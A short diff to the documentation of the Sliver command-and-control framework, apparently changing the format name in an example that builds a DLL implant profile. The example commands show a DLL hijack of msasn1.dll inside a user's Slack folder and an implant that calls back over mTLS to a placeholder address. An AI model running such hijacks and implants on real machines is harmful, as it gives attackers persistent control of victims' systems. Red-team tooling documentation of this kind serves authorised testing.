@@ -622,7 +622,7 @@ supplied with the --profile flag.
 dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --file /tmp/blah.dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll
 
 # Use a Sliver generated DLL for the hijack
-new-profile --format DLL --mtls 1.2.3.4:1234 --profile-name dll
+new-profile --format shared --mtls 1.2.3.4:1234 --profile-name dll
 dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --profile dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll
 
 # Use a local DLL as the reference DLL
